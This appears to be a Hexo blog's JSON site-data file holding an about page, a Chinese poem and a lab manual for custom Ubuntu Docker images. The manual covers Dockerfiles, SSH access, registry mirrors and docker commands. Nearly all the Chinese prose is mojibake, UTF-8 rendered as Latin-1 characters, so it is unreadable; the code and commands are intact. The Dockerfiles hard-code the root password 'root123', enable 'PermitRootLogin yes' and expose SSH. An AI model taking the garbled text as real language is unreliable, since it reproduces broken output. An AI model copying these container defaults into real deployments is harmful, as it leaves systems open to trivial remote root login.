{"meta":{"title":"Sizaif's Blog","subtitle":"Sizaifçš„å°é¢†åœ°","description":"æ˜¥æ±Ÿæ½®æ°´è¿æµ·å¹³,æµ·ä¸Šæ˜æœˆå…±æ½®ç”Ÿ.","author":"sizaif","url":"https://www.sizaif.com","root":"/"},"pages":[{"title":"","date":"2021-08-16T01:05:20.376Z","updated":"2021-08-15T15:35:26.149Z","comments":true,"path":"google16e673252f94d06c.html","permalink":"https://www.sizaif.com/google16e673252f94d06c","excerpt":"","text":"google-site-verification: google16e673252f94d06c.html"},{"title":"æ‰€æœ‰åˆ†ç±»","date":"2021-08-06T15:26:13.000Z","updated":"2021-08-14T16:15:40.775Z","comments":true,"path":"navigation/categories/index.html","permalink":"https://www.sizaif.com/navigation/categories/","excerpt":"","text":""},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2021-08-06T14:20:10.000Z","updated":"2021-08-14T16:15:40.808Z","comments":true,"path":"navigation/tags/index.html","permalink":"https://www.sizaif.com/navigation/tags/","excerpt":"","text":""},{"title":"","date":"2021-08-06T15:58:57.000Z","updated":"2021-09-20T01:12:03.202Z","comments":true,"path":"page/about/index.html","permalink":"https://www.sizaif.com/page/about/","excerpt":"","text":"About Me å…³äºæˆ‘ç»Ÿè®¡å ä½è‡ªæˆ‘è¯„ä»· çƒ­çˆ±ç”Ÿæ´»ï¼Œçƒ­çˆ±æŠ€æœ¯ é»˜é»˜çš„ç¨‹åºçŒ¿ï¼Œé»˜é»˜çš„åšäº‹ æ¢ç´¢ï¼ŒæŸ¥æ‰¾ï¼Œåˆ†äº« â€¦ è¯´ç‚¹ä»€ä¹ˆ ç®€å•çš„è®°å½•åˆ†äº«ç§‘ç ”æ¢ç´¢ä¸­é‡åˆ°çš„é—®é¢˜ä»¥åŠå¯èƒ½çš„ç›¸å…³è§£å†³æ–¹æ³•. åˆ†äº«+1 == å¿«ä¹+1 == æ”¶è·+1; é—­é—¨é€ è½¦+1 == è‡ªé—­+1 == å¿«ä¹-n è”ç³»æ–¹å¼ echo \"c2l6YWlmMjAwMEBnbWFpbC5jb20Kc2l6YWlmMjAwMEAxNjMuY29t\" | base64 -d æ˜¥æ±ŸèŠ±æœˆå¤œ å¼ è‹¥è™š æ˜¥æ±Ÿæ½®æ°´è¿æµ·å¹³ï¼Œæµ·ä¸Šæ˜æœˆå…±æ½®ç”Ÿã€‚ æ»Ÿæ»Ÿéšæ³¢åƒä¸‡é‡Œï¼Œä½•å¤„æ˜¥æ±Ÿæ— æœˆæ˜ï¼ æ±Ÿæµå®›è½¬ç»•èŠ³ç”¸ï¼Œæœˆç…§èŠ±æ—çš†ä¼¼éœ°ï¼› ç©ºé‡Œæµéœœä¸è§‰é£ï¼Œæ±€ä¸Šç™½æ²™çœ‹ä¸è§ã€‚ æ±Ÿå¤©ä¸€è‰²æ— çº¤å°˜ï¼Œçšçšç©ºä¸­å­¤æœˆè½®ã€‚ æ±Ÿç•”ä½•äººåˆè§æœˆï¼Ÿæ±Ÿæœˆä½•å¹´åˆç…§äººï¼Ÿ äººç”Ÿä»£ä»£æ— ç©·å·²ï¼Œæ±Ÿæœˆå¹´å¹´æœ›ç›¸ä¼¼ã€‚ ä¸çŸ¥æ±Ÿæœˆå¾…ä½•äººï¼Œä½†è§é•¿æ±Ÿé€æµæ°´ã€‚ ç™½äº‘ä¸€ç‰‡å»æ‚ æ‚ ï¼Œé’æ«æµ¦ä¸Šä¸èƒœæ„ã€‚ è°å®¶ä»Šå¤œæ‰èˆŸå­ï¼Ÿä½•å¤„ç›¸æ€æ˜æœˆæ¥¼ï¼Ÿ å¯æ€œæ¥¼ä¸Šæœˆè£´å›ï¼Œåº”ç…§ç¦»äººå¦†é•œå°ã€‚ ç‰æˆ·å¸˜ä¸­å·ä¸å»ï¼Œæ£è¡£ç §ä¸Šæ‹‚è¿˜æ¥ã€‚ æ­¤æ—¶ç›¸æœ›ä¸ç›¸é—»ï¼Œæ„¿é€æœˆåæµç…§å›ã€‚ é¸¿é›é•¿é£å…‰ä¸åº¦ï¼Œé±¼é¾™æ½œè·ƒæ°´æˆæ–‡ã€‚ æ˜¨å¤œé—²æ½­æ¢¦è½èŠ±ï¼Œå¯æ€œæ˜¥åŠä¸è¿˜å®¶ã€‚ æ±Ÿæ°´æµæ˜¥å»æ¬²å°½ï¼Œæ±Ÿæ½­è½æœˆå¤è¥¿æ–œã€‚ æ–œæœˆæ²‰æ²‰è—æµ·é›¾ï¼Œç¢£çŸ³æ½‡æ¹˜æ— é™è·¯ã€‚ ä¸çŸ¥ä¹˜æœˆå‡ äººå½’ï¼Œè½æœˆæ‘‡æƒ…æ»¡æ±Ÿæ ‘ã€‚"},{"title":"Clubmanualv1","date":"2021-09-16T03:26:03.000Z","updated":"2024-03-28T02:56:07.000Z","comments":true,"path":"page/clubmanualv1/index.html","permalink":"https://www.sizaif.com/page/clubmanualv1/","excerpt":"","text":"åŸºæœ¬é•œåƒè¯´æ˜ [image]:[tag] tagç‰ˆæœ¬å·ä¼šé€æ­¥æ›´æ–° å¦‚æœä¸åŠ ç‰ˆæœ¬å·çš„è¯, é»˜è®¤ä½¿ç”¨å¸¦æœ‰latestçš„ç‰ˆæœ¬( è¿™é‡Œlatestå¹¶ä¸æ˜¯æœ€æ–°çš„æ„æ€,è€Œæ˜¯æ ‡è®°tagä¸ºlatest çš„æ„æ€) basic-ubuntu:20.04 V3 æœ€æ–° ä½¿ç”¨163æº å·²å®‰è£…åŸºæœ¬å·¥å…· VIM cmake wget git autoconf automake build-essential python3.8 pip3 ssh; é»˜è®¤ç”¨æˆ·rootï¼Œé»˜è®¤å¯†ç root123ï¼›é»˜è®¤ç«¯å£22 ssh ä½¿ç”¨æ–¹æ³•ï¼š # ä¸»æœºä¸­ $docker run -dit --name &lt;å®¹å™¨name> -p &lt;å¤–éƒ¨ç«¯å£>:22 &lt;é•œåƒid> # æ­¤æ—¶è¿œç¨‹sshå¯æ­£å¸¸è¿æ¥ $ ssh root@&lt;hostip> -p &lt;å¤–éƒ¨ç«¯å£> #åœ°å€ï¼š &lt;hostip>:&lt;å¤–éƒ¨ç«¯å£> #ç”¨æˆ·åï¼šroot #å¯†ç ï¼šroot123 åˆ›å»ºä½¿ç”¨æ­¤é•œåƒåˆ›å»ºå®¹å™¨ # ç¤ºä¾‹, /home/sizworkhome/ ä¸ºè¦æ˜ å°„çš„ä¸»æœºæ–‡ä»¶å¤¹ç›®å½• # /home/workhome/ ä¸ºå®¹å™¨ä¸­è¦æ˜ å°„çš„ç›®å½• # siztest1 ä¸ºåˆ›å»ºçš„å®¹å™¨åç§° # sizaif2000/basic-ubuntu2004v3:1.0 ä¸ºè¿œç¨‹çš„é•œåƒåç§°ä»¥åŠç‰ˆæœ¬ # -p 9091:80 $ docker run -dit --name siztest1 -p 9091:22 basic-ubuntu2004v3 æºç  #Dockerfile FROM ubuntu:20.04 RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp;\\ echo 'Asia/Shanghai' > /etc/timezone &amp;&amp;\\ sed -i 's/\\/\\/.*\\/ubuntu/\\/\\/mirrors.163.com\\/ubuntu/g' /etc/apt/sources.list &amp;&amp;\\ apt update &amp;&amp; apt upgrade -y &amp;&amp;\\ apt-get -y install vim openssh-server build-essential wget cmake git autoconf automake &amp;&amp;\\ apt-get -y install software-properties-common &amp;&amp;\\ echo -e \"\\n\" | add-apt-repository ppa:deadsnakes/ppa &amp;&amp;\\ apt-get update &amp;&amp; apt-get -y upgrade &amp;&amp;\\ apt-get -y install python3.8 &amp;&amp;\\ echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config RUN echo \"root:root123\" | chpasswd COPY docker-entrypoint.sh / RUN chmod +x /docker-entrypoint.sh ENTRYPOINT [\"/docker-entrypoint.sh\"] WORKDIR /home/workhome/ EXPOSE 22 # docker-entrypoint.sh #!/bin/bash set -ex # æ˜¾ç¤ºå‘½ä»¤ã€é‡åˆ°é”™è¯¯ç«‹å³ç»ˆæ­¢ service ssh start sleep infinity ubuntu:20.04 V1 ä½¿ç”¨æ¸…åæº å·²å®‰è£…åŸºæœ¬å·¥å…·: VIM - Vi IMproved 8.1 (2018 May 18, compiled Apr 15 2020 06:40:31) cmake version 3.16.3 gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04) g++ (4:9.3.0-1ubuntu2). wget,git,autoconf,automake,build-essential Python 3.8.10 (default, Jun 2 2021, 10:49:15) pip3 pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8) ssh æ”¯æŒä½¿ç”¨filezillaç­‰è½¯ä»¶è¿›è¡Œsshä¼ è¾“æ–‡ä»¶ï¼Œç­‰ä»·äºè·¯å¾„æ˜ å°„ ssh ä½¿ç”¨æ–¹æ³•ï¼š 1. $docker run -dit -p 1112:22 &lt;é•œåƒid> 2. $docker attach &lt;å®¹å™¨id> 3. $ /etc/init.d/ssh start e.g: root@xxx:/home/workhome# $/etc/init.d/ssh start * Starting OpenBSD Secure Shell server sshd [ OK ] æ­¤æ—¶è¿œç¨‹sshå¯æ­£å¸¸è¿æ¥ åœ°å€ï¼š localhost:1112 ç”¨æˆ·åï¼šroot å¯†ç ï¼š123 åˆ›å»ºä½¿ç”¨æ­¤é•œåƒåˆ›å»ºå®¹å™¨ # ç¤ºä¾‹, /home/sizworkhome/ ä¸ºè¦æ˜ å°„çš„ä¸»æœºæ–‡ä»¶å¤¹ç›®å½• # /home/workhome/ ä¸ºå®¹å™¨ä¸­è¦æ˜ å°„çš„ç›®å½• # siztest1 ä¸ºåˆ›å»ºçš„å®¹å™¨åç§° # sizaif2000/ubuntu2004v1:2.0 ä¸ºè¿œç¨‹çš„é•œåƒåç§°ä»¥åŠç‰ˆæœ¬ # -p 8080:80 $ docker run -dit -v /home/sizworkhome:/home/workhome --name siztest1 sizaif2000/ubuntu2004v1:2.0 æºç  # Dockerfile FROM ubuntu:20.04 ADD sources.list /etc/apt/ #install common dependencies RUN DEBIAN_FRONTEND=noninteractive apt-get -y update &amp;&amp; \\ DEBIAN_FRONTEND=noninteractive apt-get -y upgrade &amp;&amp; \\ DEBIAN_FRONTEND=noninteractive apt-get -y install \\ build-essential \\ python3 \\ python3-pip \\ cmake \\ automake \\ autoconf \\ libtool \\ wget \\ git \\ vim \\ gcc # set workdir WORKDIR /home/workhome ENV WORKDIR=\"/home/workhome\" # sources.list # é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨ # deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse ubuntu:20.04 V2 ä½¿ç”¨æ¸…åæº å·²å®‰è£…åŸºæœ¬å·¥å…·: VIM - Vi IMproved 8.1 (2018 May 18, compiled Apr 15 2020 06:40:31) cmake version 3.16.3 gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04) g++ (4:9.3.0-1ubuntu2). wget,git,autoconf,automake,build-essential Python 3.8.10 (default, Jun 2 2021, 10:49:15) pip3 pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8) new add &gt;&gt; java-jdk1.8.0_291 åˆ›å»ºä½¿ç”¨æ­¤é•œåƒåˆ›å»ºå®¹å™¨ # ç¤ºä¾‹, /home/sizworkhome/ ä¸ºè¦æ˜ å°„çš„ä¸»æœºæ–‡ä»¶å¤¹ç›®å½• # /home/workhome/ ä¸ºå®¹å™¨ä¸­è¦æ˜ å°„çš„ç›®å½• # siztest1 ä¸ºåˆ›å»ºçš„å®¹å™¨åç§° # sizaif2000/ubuntu2004v2:2.0 ä¸ºè¿œç¨‹çš„é•œåƒåç§°ä»¥åŠç‰ˆæœ¬ # -p 8080:80 $ docker run -dit -v /home/sizworkhome:/home/workhome --name siztest1 sizaif2000/ubuntu2004v2:2.0 æºç  #Dockerfile FROM ubuntu:20.04 ADD sources.list /etc/apt/ #install common dependencies RUN DEBIAN_FRONTEND=noninteractive apt-get -y update &amp;&amp; \\ DEBIAN_FRONTEND=noninteractive apt-get -y upgrade &amp;&amp; \\ DEBIAN_FRONTEND=noninteractive apt-get -y install \\ build-essential \\ python3 \\ python3-pip \\ cmake \\ automake \\ autoconf \\ libtool \\ wget \\ git \\ vim \\ gcc # set workdir WORKDIR /home/workhome ENV WORKDIR=\"/home/workhome\" RUN mkdir /usr/local/java # copy java ADD jdk-8u291-linux-x64.tar.gz /usr/local/java # set jav env ENV JAVA_HOME /usr/local/java/jdk1.8.0_291 ENV JRE_HOME $&#123;JAVA_HOME&#125;/jre ENV CLASSPATH .:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib ENV PATH $&#123;JAVA_HOME&#125;/bin:$PATH # sources.list # é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨ # deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse # deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiversejdk-8u291-linux-x64.tar.gz è‡ªè¡Œä¸‹è½½javaæ–‡ä»¶å¹¶ä¿®æ”¹Dockerfileæºç ä¸­å†…å®¹ docker åˆ›å»ºå®¹å™¨ -Vscodeæ˜ å°„æ‰“å¼€ å¦‚æœæƒ³åœ¨vsodeä¸­ä½¿ç”¨ç¼–è¾‘å™¨ç›´æ¥æ‰“å¼€å¯¹åº”çš„ä»£ç è¿›è¡Œä¿®æ”¹ç¼–è¾‘ï¼Œ åœ¨vscodeèµ„æºç®¡ç†å¯ä»¥ç›´æ¥å¯¹æ–‡ä»¶è¿›è¡Œä¸Šä¼ ä¸‹è½½ï¼Œå¦‚æœæƒ³ä»æœ¬åœ°ä¸Šä¼ æ–‡ä»¶åˆ°å®¹å™¨å†…ï¼Œå¯ç›´æ¥æ‹–æ‹½ è¾¾åˆ°å¦‚ä¸‹çš„æ•ˆæœï¼š 1. é¦–å…ˆåˆ›å»ºdocker å®¹å™¨ $ docker run -it --name &lt;continer name> -p &lt;XXXX>:22 sizaif2000/basic-ubuntu2004v3:1.0 2. ä¸ºäº†é˜²æ­¢sshé“¾æ¥å¤±è´¥, è¿›å…¥å®¹å™¨, å°†sshd é‡å¯ $ root@&lt;continerid>: /etc/init.d/sshd restart 3.vscode è®¾ç½®sshè¿œç¨‹è¿æ¥ é…ç½®è§„åˆ™å¦‚ä¸‹ï¼š Host &lt;name> HostName &lt;ip> Port &lt;port> User root 4.é…ç½®å®Œæˆåï¼Œè¿›è¡Œé“¾æ¥ å¦‚æœå‡ºç°å®‰è£…æœåŠ¡å™¨å¤±è´¥ï¼š è¯·å‚è€ƒè§£å†³æ–¹æ¡ˆ-&gt; vscodeé’ˆå¯¹dockeræ‰‹åŠ¨å®‰è£…vscode server docker æ¢æº ç¼–è¾‘æ–‡ä»¶/etc/docker/daemon.jsonï¼š æŒ‰iè¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œ åœ¨æ–‡ä»¶ä¸­è¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š #ubuntu &#123; \"registry-mirrors\": [ \"https://registry.docker-cn.com\", \"https://docker.mirrors.ustc.edu.cn\", \"https://ustc-edu-cn.mirror.aliyuncs.com\", \"https://hub-mirror.c.163.com\", \"https://mirror.baidubce.com\" ] &#125; ç„¶åé‡å¯dockeræœåŠ¡ï¼Œè®©é…ç½®ç”Ÿæ•ˆ sudo systemctl daemon-reload sudo systemctl restart docker docker å¸¸è§åŸºæœ¬å‘½ä»¤ å¸¸ç”¨å‘½ä»¤ æ–°å¢è¯´æ˜2.0! åœ¨ä½¿ç”¨æ–‡ä»¶å¤¹è·¯å¾„æ˜ å°„å, éœ€é¦–å…ˆè¿›å…¥å®¹å™¨å†…ä½¿ç”¨chmod g+wxr /&lt;æ˜ å°„åçš„æ–‡ä»¶å¤¹è·¯å¾„&gt; ç»™ç»„æ·»åŠ æƒé™,å¦åˆ™å®¹å™¨å¤–åˆ›å»ºç”¨æˆ·ä¼šå‡ºç°æ²¡æœ‰æƒé™ä¿®æ”¹æ˜ å°„æ–‡ä»¶ è¯´æ˜ ä¸€: å®¹å™¨ id å¯ä»¥ç”± å‰ä¸‰ä½id ç®€ç§°ä»£æ›¿ e.g: CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS f586c498d512 sizaif2000/ubuntu2004v1:1.0 â€œbashâ€ 14 hours ago Exited (255) 5 minutes ago åˆ™f586c498d512 å¯ä»¥ç”¨f58ä»£æ›¿, ä¾‹å¦‚: docker exec -it f58 /bin/bash äºŒ: å¸¦æœ‰[xxx] å‘½ä»¤æ ·å¼çš„, è¾“å…¥å‘½ä»¤æ—¶ä¸éœ€è¦è¾“å…¥[ ] æŸ¥çœ‹é•œåƒæŸ¥çœ‹å®¹å™¨åˆ›å»ºæ–°çš„å®¹å™¨å¯åŠ¨å®¹å™¨è¿›å…¥å®¹å™¨å®¹å™¨ä¸ä¸»æœºé—´çš„æ•°æ®æ‹·è´åˆ é™¤å®¹å™¨#åˆ—å‡ºæœ¬åœ°images $ docker images #å«ä¸­é—´æ˜ åƒå±‚ $ docker images -a#æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨ $ docker ps #æŸ¥çœ‹æ­£åœ¨è¿è¡Œ+å†å²è¿è¡Œè¿‡çš„å®¹å™¨ $ docker ps -a #æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨çš„ID $ docker ps -q #æ˜¾ç¤ºè¿è¡Œå®¹å™¨æ€»æ–‡ä»¶å¤§å° $ docker ps -sæ–°å¢è¯´æ˜2.0! åœ¨ä½¿ç”¨æ–‡ä»¶å¤¹è·¯å¾„æ˜ å°„å, éœ€é¦–å…ˆè¿›å…¥å®¹å™¨å†…ä½¿ç”¨chmod g+wxr /&lt;æ˜ å°„åçš„æ–‡ä»¶å¤¹è·¯å¾„&gt; ç»™ç»„æ·»åŠ æƒé™,å¦åˆ™å®¹å™¨å¤–åˆ›å»ºç”¨æˆ·ä¼šå‡ºç°æ²¡æœ‰æƒé™ä¿®æ”¹æ˜ å°„æ–‡ä»¶ # docker run -dit -p ä¸»æœºç«¯å£:å®¹å™¨ä¸­ç«¯å£ -v ä¸»æœºä¸­è¦æ˜ å°„çš„æ–‡ä»¶å¤¹ç»å¯¹ç›®å½•:å®¹å™¨é‡Œæ˜ å°„è·¯å¾„ --name èµ·ä¸ªåå­— ubuntu:ä½ çš„é•œåƒtagï¼ˆé»˜è®¤æ˜¯latestï¼‰ # å¦‚æœä¸éœ€è¦ç«¯å£æ˜ å°„ å°±ä¸éœ€è¦åŠ  -p å‚æ•° # e.g: docker run -dit -v /home/whxiang/workdir:/home/workdir --name whx_test sizaif2000/ubuntu2004v1:1.0 å½“åœ¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™å‘ç°ä¸€ä¸ªæ–°çš„é—®é¢˜: å³ç»„å†…æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶åœ¨å®¹å™¨ä¸­å› ä¸ºæ²¡æœ‰ç›¸åº”çš„uid:gid æ˜ å°„, å¹¶ä¸”å®¹å™¨ä¸­çš„rootç”¨æˆ·çš„æƒé™å¾ˆä½æ—¶(ç»„ç®¡ç†å‘˜æ‹¥æœ‰sudoæƒé™,ä½†éœ€è¦è¾“å…¥sudoæ‰å¯ä»¥; è€Œå®¹å™¨ä¸­æ—¶æ²¡æœ‰sudoå‘½ä»¤çš„,æ‰€æœ‰è¯´è¿™é‡Œçš„rootæƒé™å¾ˆä½)åœ¨è¿™ç§æƒ…å†µä¸‹: å°±ä¼šå‡ºç°æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶,åœ¨å®¹å™¨ä¸­è¢«è¯†åˆ«ä¸º: `nobody ,nogroups ç°è±¡ æš‚æ—¶çš„è§£å†³æ–¹æ³• æ™®é€šç”¨æˆ·åˆ é™¤ç§æœ‰ç»„,å³è®©æ™®é€šç”¨æˆ·çš„ä¸»ç»„ä¸º(dockerå®¹å™¨æ˜ å°„çš„ç®¡ç†å‘˜æ‰€åœ¨çš„ç»„)â€‹ ä¾‹å¦‚: æœ¬æ–‡æ¼”ç¤ºå°ç»„ç®¡ç†å‘˜ä¸ºsiz, ç»„åä¸º(siz) åˆ™è®© æ™®é€šç”¨æˆ·test&lt;xxx&gt; çš„ä¸»ç»„ä¸ºsiz# å‘½ä»¤: sudo usermod -g &lt;å°ç»„ç®¡ç†å‘˜åç§°> &lt;æ™®é€šç”¨æˆ·åç§°> # å°†æ™®é€šç”¨æˆ·çš„ä¸»ç»„ä»ç§æœ‰ç»„æ”¹ä¸ºå°ç»„ç®¡ç†å‘˜æ‰€åœ¨çš„ç»„ $ sudo usermod -g test1 sizå¯¹å®¿ä¸»æœº(å®¹å™¨å¤–)ç»„æˆå‘˜ä¸­æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æå‡ç»„æƒé™ç›®çš„: ä½¿å®¹å™¨å†…rootè·å¾—å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æ‹¥æœ‰ä¿®æ”¹(w) æƒé™ $ chmod g+wxr &lt;xxx>å¯¹å®¹å™¨å†…root åˆ›å»ºçš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æå‡ç»„æƒé™ç›®çš„: ä½¿å®¿ä¸»æœº(å®¹å™¨å¤–) ç»„æˆå‘˜æ™®é€šç”¨æˆ·è·å¾—å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æ‹¥æœ‰ä¿®æ”¹(w) æƒé™$ chmod g+wxr &lt;xxx>ç¼ºé™·:å½“å†…å¤–åˆ›å»ºæ–°çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä½¿, å†…å¤–è¦ä¸æ–­çš„ä½¿ç”¨chmod å‘½ä»¤è¿›è¡Œæˆæƒ, $ docker start [container_id]# å¸¸ç”¨è¿›å…¥å‘½ä»¤ $ docker exec -it [container_id] /bin/bash # æˆ–è€…ä½¿ç”¨attach å‘½ä»¤ # æ³¨æ„!!!! ä½¿ç”¨ attachå‘½ä»¤æ—¶, é¡»åœ¨runåˆ›å»ºå®¹å™¨çš„æ—¶å€™å¸¦æœ‰ -it å‚æ•°, è´Ÿè´£ä¼šå‡ºç°è¿›å…¥å®¹å™¨åæ— æ³•äº¤äº’è¾“å…¥å‘½ä»¤çš„æƒ…å†µ $ docker attach [container_id]#å°†å®¹å™¨ä¸­çš„æŸä¸ªè·¯å¾„ä¸‹æ–‡ä»¶copyè‡³ä¸»æœºæœ¬åœ°è·¯å¾„ $ docker cp [container_id]:/[container_file_path] [local_path] #å°†ä¸»æœºæ–‡ä»¶copyè‡³å®¹å™¨ä¸­çš„æŸä¸ªè·¯å¾„ä¸‹ $ docker cp [local_file_path] [container_id]:/[container_file_path]/ #å°†ä¸»æœºæ–‡ä»¶copyè‡³å®¹å™¨ä¸­ä¸­çš„æŸä¸ªè·¯å¾„ä¸‹ï¼Œç›®å½•é‡å‘½åä¸º[container_path]ï¼ˆæ³¨æ„ä¸éé‡å‘½åcopyçš„åŒºåˆ«ï¼‰ $ docker cp [local_file_path] [container_id]:/[container_file_path]$ docker rm [container_id] é•œåƒæ“ä½œè¯¦ç»† æ‹‰å–é•œåƒæ¨é€é•œåƒåˆ é™¤é•œåƒ#ä¸‹è½½ubuntuå®˜æ–¹æœ€æ–°é•œåƒï¼Œç›¸å½“äºï¼šdocker pull ubuntu:latest $ docker pull ubuntu #ä¸‹è½½ä»“åº“æ‰€æœ‰Redisé•œåƒ $ docker pull -a ubuntu #ä¸‹è½½ç§äººä»“åº“é•œåƒ # docker pull dockerUserName/xxxx:tag # e.g: docker pull sizaif2000/ubuntu2004v1:1.0æ¨é€å‰,éœ€è¦å…ˆæ‰“åŒ…æˆ dockerUserName/xxx:tag å¦‚æœä»å®¹å™¨å¼€å§‹æ¨é€, åˆ™éœ€è¦å…ˆæ‰§è¡Œ $ docker commit [container_Id] dockerUserName/xxx:tag å¦‚æœä»é•œåƒå¼€å§‹æ¨é€,åˆ™éœ€è¦æ‰§è¡Œ$ docker tag imageName dockerUserName/xxx[:tag] # å°†æ‰“åŒ…å¥½çš„é•œåƒæ¨é€çš„dockerhubä¸­ $ docker push dockerUserName/xxx:tag#å•ä¸ªé•œåƒåˆ é™¤ï¼Œç›¸å½“äºï¼šdocker rmi ubuntu:latest $ docker rmi [image_name] #å¼ºåˆ¶åˆ é™¤(é’ˆå¯¹åŸºäºé•œåƒæœ‰è¿è¡Œçš„å®¹å™¨è¿›ç¨‹) $ docker rmi -f [image_name] #å¤šä¸ªé•œåƒåˆ é™¤ï¼Œä¸åŒé•œåƒé—´ä»¥ç©ºæ ¼é—´éš” $ docker rmi -f ubuntu tomcat nginx #åˆ é™¤æœ¬åœ°å…¨éƒ¨é•œåƒ $ docker rmi -f $(docker images -q) å®¹å™¨æ“ä½œè¯¦ç»† åˆ›å»ºæ–°çš„å®¹å™¨æœ¬åœ°ç›®å½•æ˜ å°„å®¹å™¨ç«¯å£æ˜ å°„å®¹å™¨è¿›å…¥å®¹å™¨æ„å»ºé•œåƒåˆ é™¤å®¹å™¨æ–°å¢è¯´æ˜2.0! åœ¨ä½¿ç”¨æ–‡ä»¶å¤¹è·¯å¾„æ˜ å°„å, éœ€é¦–å…ˆè¿›å…¥å®¹å™¨å†…ä½¿ç”¨chmod g+wxr /&lt;æ˜ å°„åçš„æ–‡ä»¶å¤¹è·¯å¾„&gt; ç»™ç»„æ·»åŠ æƒé™,å¦åˆ™å®¹å™¨å¤–åˆ›å»ºç”¨æˆ·ä¼šå‡ºç°æ²¡æœ‰æƒé™ä¿®æ”¹æ˜ å°„æ–‡ä»¶ #æ–°å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼Œå‚æ•°ï¼š-i ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼›-t ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯; -d å·²å®ˆæŠ¤æ–¹å¼å¯åŠ¨å®¹å™¨ï¼›--name ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§° # æ ¼å¼ docker run -dit --name [name] [images]:[tag] $ docker run -dit --name siztest sizaif2000/ubuntu20004v1:1.0 # docker run -dit -p 8080:80 -v /e/windowssrc:å®¹å™¨é‡Œæ˜ å°„è·¯å¾„ --name èµ·ä¸ªåå­— ubuntu:ä½ çš„é•œåƒtagï¼ˆé»˜è®¤æ˜¯latestï¼‰é¡¾åæ€ä¹‰: æ˜ å°„æœ¬åœ°ç›®å½•, å³æŠŠä¸»æœºæœ¬åœ°ç›®å½•æ˜ å°„åˆ°å®¹å™¨ä¸­æŒ‡å®šç›®å½•ä¸­,å®ç°åœ¨ä¸»æœºæœ¬åœ°ä¿®æ”¹,åœ¨ä»å®¹å™¨ä¸­å¯åŒæ­¥æŸ¥çœ‹ä¿®æ”¹ æ–¹å¼: ä¸€èˆ¬æ˜¯åœ¨åˆ›å»ºå®¹å™¨æ—¶,è®¾ç½®æœ¬åœ°ç›®å½•æ˜ å°„ åˆ›å»ºæ—¶æ˜ å°„æœ¬åœ°ç›®å½• # æ ¼å¼ -v ä¸»æœºæ–‡ä»¶å¤¹ç›®å½•:å®¹å™¨é‡Œæ˜ å°„è·¯å¾„ $ docker run -dit -v /e/windowssrc:/home/workhome --name siztest sizaif2000/ubuntu20004v1:1.0 ä¸€é—®ä¸€ç­” é—®é¢˜ä¸€: å¦‚æœæˆ‘å·²ç»åˆ›å»ºå®Œå®¹å™¨äº†, æˆ‘å†æƒ³æ˜ 